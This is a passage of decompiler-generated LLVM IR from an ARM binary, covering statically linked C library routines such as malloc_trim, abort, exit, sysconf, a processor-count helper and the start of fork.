  %v1_11ca0 = add i32 %v3_11c94, -1
  store i32 %v1_11ca0, i32* %r2.global-to-local, align 4
  %v2_11ca4 = sub i32 %v3_11c98, %v2_11c9c
  store i32 %v2_11ca4, i32* %r3.global-to-local, align 4
  store i32 %v2_11ca4, i32* %v2_11c98, align 4
  %v1_11cac = load i32, i32* @lr, align 4
  %v2_11cac = add i32 %v1_11cac, 848
  %v3_11cac = inttoptr i32 %v2_11cac to i32*
  store i32 %v1_11ca0, i32* %v3_11cac, align 4
  %v0_11cb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11cb0 = load i32, i32* @r5, align 4
  %v2_11cb0 = sub i32 %v1_11cb0, %v0_11cb0
  store i32 %v2_11cb0, i32* %r0.global-to-local, align 4
  %v4_11cb4 = call i32 @munmap(i32 %v2_11cb0, i32 %v2_11c9c, i32 %v1_11ca0, i32 %v2_11ca4)
  store i32 %v4_11cb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cb8

dec_label_pc_11cb8:                               ; preds = %bb16, %dec_label_pc_11c48, %dec_label_pc_11c80, %dec_label_pc_11b34, %dec_label_pc_11c90
  store i32 %v2_11ac8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_11cc4 = load i32, i32* @r7, align 4
  %v2_11cc4 = add i32 %v0_11cc4, 44
  %v3_11cc4 = inttoptr i32 %v2_11cc4 to i32*
  %v4_11cc4 = load i32, i32* %v3_11cc4, align 4
  store i32 %v4_11cc4, i32* %ip.global-to-local, align 4
  store i32 72912, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11cc4)
  br label %dec_label_pc_11cd0

dec_label_pc_11cd0:                               ; preds = %entry, %dec_label_pc_11cb8
  store i32 %v3_11abc, i32* @r4, align 4
  store i32 %v6_11abc, i32* @r5, align 4
  store i32 %v9_11abc, i32* @r6, align 4
  store i32 %v12_11abc, i32* @r7, align 4
  store i32 %v18_11abc, i32* @lr, align 4
  ret i32 %v2_11ac8

; uselistorder directives
  uselistorder i32 %v0_11c68, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_11c28, { 1, 0 }
  uselistorder i32 %v1_11b68, { 1, 0 }
  uselistorder i32 %v0_11b68, { 1, 0 }
  uselistorder i32 %v3_11b3c, { 1, 0 }
  uselistorder i32 %v1_11b20, { 1, 0, 2 }
  uselistorder i32 %v2_11b1c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11b14, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11ac4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_11cd0, { 1, 0 }
  uselistorder label %dec_label_pc_11cb8, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_11c48, { 1, 0 }
  uselistorder label %dec_label_pc_11c08, { 1, 0 }
  uselistorder label %dec_label_pc_11bfc, { 1, 0 }
  uselistorder label %dec_label_pc_11bf8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11bac, { 1, 0 }
}

define i32 @function_11ce0(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ce0:
  %v0_11ce0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ce0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_11ce0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11ce0, %bb
  %v4_11cf4 = phi i32 [ %arg1, %dec_label_pc_11ce0 ], [ 0, %bb ]
  ret i32 %v4_11cf4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_11cf8 = load i32, i32* @r4, align 4
  store i32 %v3_11cf8, i32* %stack_var_-12, align 4
  %v6_11cf8 = load i32, i32* @r5, align 4
  %v4_11d08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_11d08, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_11d08, i32* @r0, align 4
  %v0_11d18 = call i32 @__malloc_consolidate()
  %v0_11d1c = load i32, i32* @r4, align 4
  %v0_11d20 = load i32, i32* @r5, align 4
  %v2_11d28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11d28, i32* @r4, align 4
  store i32 %v6_11cf8, i32* @r5, align 4
  %v2_11d2c = call i32 @__malloc_trim(i32 %v0_11d1c, i32 %v0_11d20)
  %v0_11d30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d30, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_11d34 = phi i32 [ %v2_11d2c, %entry ], [ 0, %bb ]
  ret i32 %v4_11d34

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r5, align 4
  %v4_11d50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 16) to i32*), align 4
  store i32 73052, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11d50)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_11d78 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_11d80 = load i32, i32* @r5, align 4
  %v2_11d80 = add i32 %v0_11d80, 628
  %v3_11d80 = inttoptr i32 %v2_11d80 to i32*
  %v4_11d80 = load i32, i32* %v3_11d80, align 4
  %v2_11d84 = icmp eq i32 %v4_11d80, 0
  br i1 %v2_11d84, label %dec_label_pc_11d8c, label %dec_label_pc_11dcc

dec_label_pc_11d8c:                               ; preds = %entry
  store i32 1, i32* %v3_11d80, align 4
  br label %dec_label_pc_11d94

dec_label_pc_11d94:                               ; preds = %dec_label_pc_11ddc, %dec_label_pc_11d8c
  %v0_11d98 = load i32, i32* @r5, align 4
  %v2_11d98 = add i32 %v0_11d98, 212
  store i32 %v2_11d98, i32* @r4, align 4
  %v2_11da4 = add i32 %v0_11d98, 68
  %v3_11da4 = inttoptr i32 %v2_11da4 to i32*
  %v4_11da4 = load i32, i32* %v3_11da4, align 4
  call void @__pseudo_branch(i32 %v4_11da4)
  %v1_11db4 = call i32 @__GI_raise(i32 6)
  %v0_11dc0 = load i32, i32* @r5, align 4
  %v2_11dc0 = add i32 %v0_11dc0, 16
  %v3_11dc0 = inttoptr i32 %v2_11dc0 to i32*
  %v4_11dc0 = load i32, i32* %v3_11dc0, align 4
  store i32 73164, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11dc0)
  %v0_11dd0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11dcc

dec_label_pc_11dcc:                               ; preds = %entry, %dec_label_pc_11d94
  %v1_11de4 = phi i32 [ %v0_11d80, %entry ], [ %v0_11dd0.pre, %dec_label_pc_11d94 ]
  %v2_11dd0 = add i32 %v1_11de4, 628
  %v3_11dd0 = inttoptr i32 %v2_11dd0 to i32*
  %v4_11dd0 = load i32, i32* %v3_11dd0, align 4
  %v7_11dd4 = icmp eq i32 %v4_11dd0, 1
  br i1 %v7_11dd4, label %dec_label_pc_11ddc, label %dec_label_pc_11e18

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11dcc
  %v2_11ddc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_11ddc, i32* @r4, align 4
  store i32 2, i32* %v3_11dd0, align 4
  %v3_11df4 = bitcast i32* %stack_var_-28 to i8*
  %v4_11df4 = call i32 @__GI_memset(i8* %v3_11df4, i32 0, i32 20)
  %v3_11e10 = call i32 @__libc_sigaction(i32 6, i32 %v2_11ddc, i32 0)
  br label %dec_label_pc_11d94

dec_label_pc_11e18:                               ; preds = %dec_label_pc_11dcc
  %v7_11e18 = icmp eq i32 %v4_11dd0, 2
  br i1 %v7_11e18, label %dec_label_pc_11e20, label %dec_label_pc_11e2c

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11e18
  store i32 3, i32* %v3_11dd0, align 4
  %v0_11e28 = call i32 @abort()
  %v0_11e2c.pre = load i32, i32* @r5, align 4
  %v1_11e2c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11e2c

dec_label_pc_11e2c:                               ; preds = %dec_label_pc_11e18, %dec_label_pc_11e20
  %v3_11e38 = phi i32 [ 628, %dec_label_pc_11e18 ], [ %v1_11e2c.pre, %dec_label_pc_11e20 ]
  %v2_11e38 = phi i32 [ %v1_11de4, %dec_label_pc_11e18 ], [ %v0_11e2c.pre, %dec_label_pc_11e20 ]
  %v2_11e2c = add i32 %v2_11e38, %v3_11e38
  %v3_11e2c = inttoptr i32 %v2_11e2c to i32*
  %v4_11e2c = load i32, i32* %v3_11e2c, align 4
  %v7_11e30 = icmp eq i32 %v4_11e2c, 3
  br i1 %v7_11e30, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11e2c
  store i32 4, i32* %v3_11e2c, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11e2c, %bb
  call void @__pseudo_cond_branch(i1 %v7_11e30, i32 ptrtoint (i32* @global_var_13800.706 to i32))
  br label %dec_label_pc_11e44

dec_label_pc_11e44:                               ; preds = %dec_label_pc_11e44, %.thread2
  %v0_11e44 = call i32 @abort()
  br label %dec_label_pc_11e44

; uselistorder directives
  uselistorder i32* %v3_11dd0, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_11e2c, { 1, 0 }
  uselistorder label %dec_label_pc_11dcc, { 1, 0 }
}

define i32 @function_11e50(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e50:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_11e50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e50, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11e50
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11e50, %bb
  %v4_11e5c = phi i32 [ %tmp, %dec_label_pc_11e50 ], [ 0, %bb ]
  ret i32 %v4_11e5c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r5, align 4
  %v4_11e6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 140) to i32*), align 4
  store i32 %v4_11e6c, i32* @r4, align 4
  %v2_11e74 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_11e8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11e8c)
  %v0_11ea0 = load i32, i32* @r5, align 4
  %v2_11ea0 = add i32 %v0_11ea0, 16
  %v3_11ea0 = inttoptr i32 %v2_11ea0 to i32*
  %v4_11ea0 = load i32, i32* %v3_11ea0, align 4
  call void @__pseudo_branch(i32 %v4_11ea0)
  %v0_11eb0 = load i32, i32* @r5, align 4
  %v2_11eb0 = add i32 %v0_11eb0, 632
  %v3_11eb0 = inttoptr i32 %v2_11eb0 to i32*
  %v4_11eb0 = load i32, i32* %v3_11eb0, align 4
  %v2_11eb8 = icmp eq i32 %v4_11eb0, 0
  br i1 %v2_11eb8, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_11ec4 = xor i1 %v2_11eb8, true
  call void @__pseudo_cond_branch(i1 %v2_11ec4, i32 %v4_11eb0)
  store i32 %v2_11e74, i32* @r0, align 4
  %v0_11ed4 = load i32, i32* @r5, align 4
  %v2_11ed4 = add i32 %v0_11ed4, 44
  %v3_11ed4 = inttoptr i32 %v2_11ed4 to i32*
  %v4_11ed4 = load i32, i32* %v3_11ed4, align 4
  call void @__pseudo_branch(i32 %v4_11ed4)
  %v0_11ee0 = call i32 @__GI___uClibc_fini()
  %v0_11ee8 = load i32, i32* @r5, align 4
  %v2_11ee8 = add i32 %v0_11ee8, -49592
  %v2_11ef0 = icmp eq i32 %v2_11ee8, 0
  br i1 %v2_11ef0, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_11ef8 = xor i1 %v2_11ef0, true
  call void @__pseudo_cond_branch(i1 %v2_11ef8, i32 %v2_11ee8)
  %v0_11efc = load i32, i32* @r6, align 4
  %v1_11f00 = call i32 @__GI__exit(i32 %v0_11efc)
  %v0_11f04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f04, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_11f04 = load i32, i32* @r4, align 4
  %v5_11f04 = mul i32 %v2_11f04, 536870912
  %v6_11f04 = and i32 %v5_11f04, %v1_11f00
  store i32 %v6_11f04, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_11f1c = phi i32 [ %v1_11f00, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_11f1c

; uselistorder directives
  uselistorder i32 %v1_11f00, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -34036), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_11f44 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -34036))
  store i32 %v1_11f44, i32* @r6, align 4
  %v2_11f48 = icmp eq i32 %v1_11f44, 0
  br i1 %v2_11f48, label %dec_label_pc_11fc8, label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_11f58 = load i32, i32* @r4, align 4
  %v2_11f58 = add i32 %v0_11f58, -34024
  store i32 %v2_11f58, i32* @r8, align 4
  %v2_11f5c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11f5c, i32* @r7, align 4
  br label %bb18

dec_label_pc_11f64:                               ; preds = %bb18
  %v3_11f64 = load i32, i32* %stack_var_-36, align 4
  %v1_11f68 = inttoptr i32 %v3_11f64 to i32*
  %v2_11f68 = load i32, i32* %v1_11f68, align 4
  %v1_11f6c = inttoptr i32 %v2_11f68 to i8*
  %v2_11f6c = load i8, i8* %v1_11f6c, align 1
  %v7_11f70 = icmp eq i8 %v2_11f6c, 99
  br i1 %v7_11f70, label %dec_label_pc_11f78, label %.backedge3

dec_label_pc_11f78:                               ; preds = %dec_label_pc_11f64
  %v1_11f78 = add i32 %v2_11f68, 1
  %v2_11f78 = inttoptr i32 %v1_11f78 to i8*
  %v3_11f78 = load i8, i8* %v2_11f78, align 1
  %v7_11f7c = icmp eq i8 %v3_11f78, 112
  br i1 %v7_11f7c, label %dec_label_pc_11f84, label %.backedge3

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f78
  %v1_11f84 = add i32 %v2_11f68, 2
  %v2_11f84 = inttoptr i32 %v1_11f84 to i8*
  %v3_11f84 = load i8, i8* %v2_11f84, align 1
  %v7_11f88 = icmp eq i8 %v3_11f84, 117
  br i1 %v7_11f88, label %dec_label_pc_11f90, label %.backedge3

dec_label_pc_11f90:                               ; preds = %dec_label_pc_11f84
  %v1_11f90 = add i32 %v2_11f68, 3
  %v2_11f90 = inttoptr i32 %v1_11f90 to i8*
  %v3_11f90 = load i8, i8* %v2_11f90, align 1
  %v4_11f90 = zext i8 %v3_11f90 to i32
  %v0_11f94 = load i32, i32* @r4, align 4
  %v1_11f94 = load i32, i32* @sl, align 4
  %v2_11f94 = add i32 %v1_11f94, %v0_11f94
  %v3_11f94 = inttoptr i32 %v2_11f94 to i32*
  %v4_11f94 = load i32, i32* %v3_11f94, align 4
  %v2_11f98 = mul nuw nsw i32 %v4_11f90, 2
  %v2_11f9c = add i32 %v4_11f94, %v2_11f98
  %v3_11f9c = inttoptr i32 %v2_11f9c to i16*
  %v4_11f9c = load i16, i16* %v3_11f9c, align 2
  %v1_11fa0 = and i16 %v4_11f9c, 8
  %v2_11fa0 = icmp eq i16 %v1_11fa0, 0
  br i1 %v2_11fa0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_11f90
  %v1_11fa4 = load i32, i32* @r5, align 4
  %v2_11fa4 = add i32 %v1_11fa4, 1
  store i32 %v2_11fa4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_11f90, %dec_label_pc_11f64, %dec_label_pc_11f78, %dec_label_pc_11f84
  %v0_11fa8.pre = load i32, i32* @r6, align 4
  %v0_11fb4.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_11f50
  %v0_11fb4 = phi i32 [ %v0_11fb4.pre, %.backedge3 ], [ %v2_11f58, %dec_label_pc_11f50 ]
  %v0_11fa8 = phi i32 [ %v0_11fa8.pre, %.backedge3 ], [ %v1_11f44, %dec_label_pc_11f50 ]
  %v4_11fb8 = inttoptr i32 %v0_11fa8 to i32*
  %v5_11fb8 = call i32 @__GI_config_read(i32* %v4_11fb8, i32 %v2_11f5c, i32 258, i32 %v0_11fb4)
  %v2_11fbc = icmp eq i32 %v5_11fb8, 0
  br i1 %v2_11fbc, label %dec_label_pc_1202c, label %dec_label_pc_11f64

dec_label_pc_11fc8:                               ; preds = %entry
  %v0_11fcc = load i32, i32* @r4, align 4
  %v2_11fcc = add i32 %v0_11fcc, -34020
  store i32 %v2_11fcc, i32* @r0, align 4
  %v1_11fd0 = call i32 @__GI_config_open(i32 %v2_11fcc)
  store i32 %v1_11fd0, i32* @r6, align 4
  %v2_11fd4 = icmp eq i32 %v1_11fd0, 0
  br i1 %v2_11fd4, label %bb19, label %dec_label_pc_11fe0

bb19:                                             ; preds = %dec_label_pc_11fc8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1202c

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11fc8
  %v0_11fe4 = load i32, i32* @r4, align 4
  %v2_11fe4 = add i32 %v0_11fe4, -34004
  store i32 %v2_11fe4, i32* @r8, align 4
  %v2_11fec = add i32 %v0_11fe4, -33968
  store i32 %v2_11fec, i32* @r7, align 4
  %v2_11ff0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11ff0, i32* @r4, align 4
  br label %bb21

dec_label_pc_11ff8:                               ; preds = %bb21
  %v0_12024 = load i32, i32* @r8, align 4
  %v3_11ff8 = load i32, i32* %stack_var_-36, align 4
  %v1_11ffc = inttoptr i32 %v3_11ff8 to i32*
  %v2_11ffc = load i32, i32* %v1_11ffc, align 4
  store i32 %v2_11ffc, i32* @r1, align 4
  %v2_12000 = inttoptr i32 %v0_12024 to i8*
  %v3_12000 = call i32 @__GI_strcoll(i8* %v2_12000, i32 %v2_11ffc)
  %v2_12004 = icmp eq i32 %v3_12000, 0
  br i1 %v2_12004, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_11ff8
  %v1_12008 = load i32, i32* @r5, align 4
  %v2_12008 = add i32 %v1_12008, 1
  store i32 %v2_12008, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_11ff8
  %v0_12014.pre = load i32, i32* @r7, align 4
  %v0_12018.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_11fe0
  %v0_12018 = phi i32 [ %v0_12018.pre, %.backedge ], [ %v1_11fd0, %dec_label_pc_11fe0 ]
  %v0_12014 = phi i32 [ %v0_12014.pre, %.backedge ], [ %v2_11fec, %dec_label_pc_11fe0 ]
  %v4_1201c = inttoptr i32 %v0_12018 to i32*
  %v5_1201c = call i32 @__GI_config_read(i32* %v4_1201c, i32 %v2_11ff0, i32 459266, i32 %v0_12014)
  %v2_12020 = icmp eq i32 %v5_1201c, 0
  br i1 %v2_12020, label %dec_label_pc_1202c, label %dec_label_pc_11ff8

dec_label_pc_1202c:                               ; preds = %bb18, %bb21, %bb19
  %v0_1202c = load i32, i32* @r6, align 4
  %v1_12030 = inttoptr i32 %v0_1202c to i32*
  %v2_12030 = call i32 @__GI_config_close(i32* %v1_12030)
  %v0_12034 = load i32, i32* @r5, align 4
  %v2_12034 = icmp eq i32 %v0_12034, 0
  %.v0_12034 = select i1 %v2_12034, i32 1, i32 %v0_12034
  ret i32 %.v0_12034

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_1202c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_12460

bb:                                               ; preds = %entry
  %v7_12084 = mul i32 %arg1, 4
  %v8_12084 = add i32 %v7_12084, ptrtoint (i32* @global_var_1208c.725 to i32)
  call void @__pseudo_branch(i32 %v8_12084)
  br label %dec_label_pc_12460

dec_label_pc_12460:                               ; preds = %bb, %entry
  %v0_12464 = call i32 @__aeabi_read_tp()
  %v3_12468 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_12468 = sext i16 %v3_12468 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12474 = add i32 %v4_12468, %v0_12464
  %v4_12474 = inttoptr i32 %v3_12474 to i32*
  store i32 22, i32* %v4_12474, align 4
  %v0_12658 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_12658

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12680, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r8.global-to-local, align 4
  %v4_1278416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12680) to i32*), align 4
  store i32 %v4_1278416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1278818 = icmp eq i32 %v4_1278416, 0
  br i1 %v2_1278818, label %dec_label_pc_12790, label %dec_label_pc_126b4

dec_label_pc_126b4:                               ; preds = %entry, %dec_label_pc_12784.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_126c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_126c0 = add i32 %v0_126c0, 20
  %v2_126c0 = inttoptr i32 %v1_126c0 to i32*
  %v3_126c0 = load i32, i32* %v2_126c0, align 4
  store i32 %v3_126c0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_126c4 = icmp eq i32 %v3_126c0, 0
  store i32 %v3_126c0, i32* %r4.global-to-local, align 4
  br i1 %v2_126c4, label %dec_label_pc_12784.backedge, label %dec_label_pc_126d4

dec_label_pc_12784.backedge:                      ; preds = %dec_label_pc_126b4, %dec_label_pc_12700
  %v0_12784 = load i32, i32* %r8.global-to-local, align 4
  %v1_12784 = load i32, i32* %r5.global-to-local, align 4
  %v2_12784 = add i32 %v1_12784, %v0_12784
  %v3_12784 = inttoptr i32 %v2_12784 to i32*
  %v4_12784 = load i32, i32* %v3_12784, align 4
  store i32 %v4_12784, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12788 = icmp eq i32 %v4_12784, 0
  br i1 %v2_12788, label %dec_label_pc_12790, label %dec_label_pc_126b4

dec_label_pc_126d4:                               ; preds = %dec_label_pc_126b4
  %v0_126d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_126d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_126d4 = add i32 %v1_126d4, %v0_126d4
  %v3_126d4 = inttoptr i32 %v2_126d4 to i32*
  %v4_126d4 = load i32, i32* %v3_126d4, align 4
  %v1_126d8 = add i32 %v4_126d4, 20
  store i32 %v1_126d8, i32* %r2.global-to-local, align 4
  %v1_126dc132 = inttoptr i32 %v1_126d8 to i32*
  %v2_126dc133 = load i32, i32* %v1_126dc132, align 4
  store i32 %v2_126dc133, i32* %r3.global-to-local, align 4
  %v3_126e0135 = icmp uge i32 %v2_126dc133, %v3_126c0
  store i1 %v3_126e0135, i1* %cpsr_c.global-to-local, align 1
  %v9_126e0141 = icmp eq i32 %v2_126dc133, %v3_126c0
  br i1 %v9_126e0141, label %dec_label_pc_126e8, label %dec_label_pc_12700

dec_label_pc_126e8:                               ; preds = %dec_label_pc_126d4, %dec_label_pc_126e8.dec_label_pc_126dc_crit_edge
  %v0_126e8142 = phi i32 [ %v1_126e0.pre, %dec_label_pc_126e8.dec_label_pc_126dc_crit_edge ], [ %v3_126c0, %dec_label_pc_126d4 ]
  store i32 %v0_126e8142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_126f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_126f8, label %dec_label_pc_126fc, label %dec_label_pc_126e8.dec_label_pc_126dc_crit_edge

dec_label_pc_126e8.dec_label_pc_126dc_crit_edge:  ; preds = %dec_label_pc_126e8
  %v0_126dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_126e0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_126dc = inttoptr i32 %v0_126dc.pre to i32*
  %v2_126dc = load i32, i32* %v1_126dc, align 4
  store i32 %v2_126dc, i32* %r3.global-to-local, align 4
  %v3_126e0 = icmp uge i32 %v2_126dc, %v1_126e0.pre
  store i1 %v3_126e0, i1* %cpsr_c.global-to-local, align 1
  %v9_126e0 = icmp eq i32 %v2_126dc, %v1_126e0.pre
  br i1 %v9_126e0, label %dec_label_pc_126e8, label %dec_label_pc_12700

dec_label_pc_126fc:                               ; preds = %dec_label_pc_126e8
  %v0_126fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_126fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %dec_label_pc_126d4, %dec_label_pc_126e8.dec_label_pc_126dc_crit_edge, %dec_label_pc_126fc
  %v0_12700 = phi i32 [ %v0_126fc, %dec_label_pc_126fc ], [ %v2_126dc133, %dec_label_pc_126d4 ], [ %v2_126dc, %dec_label_pc_126e8.dec_label_pc_126dc_crit_edge ]
  %v1_12700 = phi i32 [ %v0_126fc, %dec_label_pc_126fc ], [ %v3_126c0, %dec_label_pc_126d4 ], [ %v1_126e0.pre, %dec_label_pc_126e8.dec_label_pc_126dc_crit_edge ]
  %v3_12700 = icmp uge i32 %v0_12700, %v1_12700
  store i1 %v3_12700, i1* %cpsr_c.global-to-local, align 1
  %v9_12700 = icmp eq i32 %v0_12700, %v1_12700
  br i1 %v9_12700, label %dec_label_pc_12708, label %dec_label_pc_12784.backedge

dec_label_pc_12708:                               ; preds = %dec_label_pc_12700
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1271c = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_12774, %dec_label_pc_12708
  %v0_1270c = load i32, i32* %r7.global-to-local, align 4
  %v1_1270c = add i32 %v0_1270c, 4
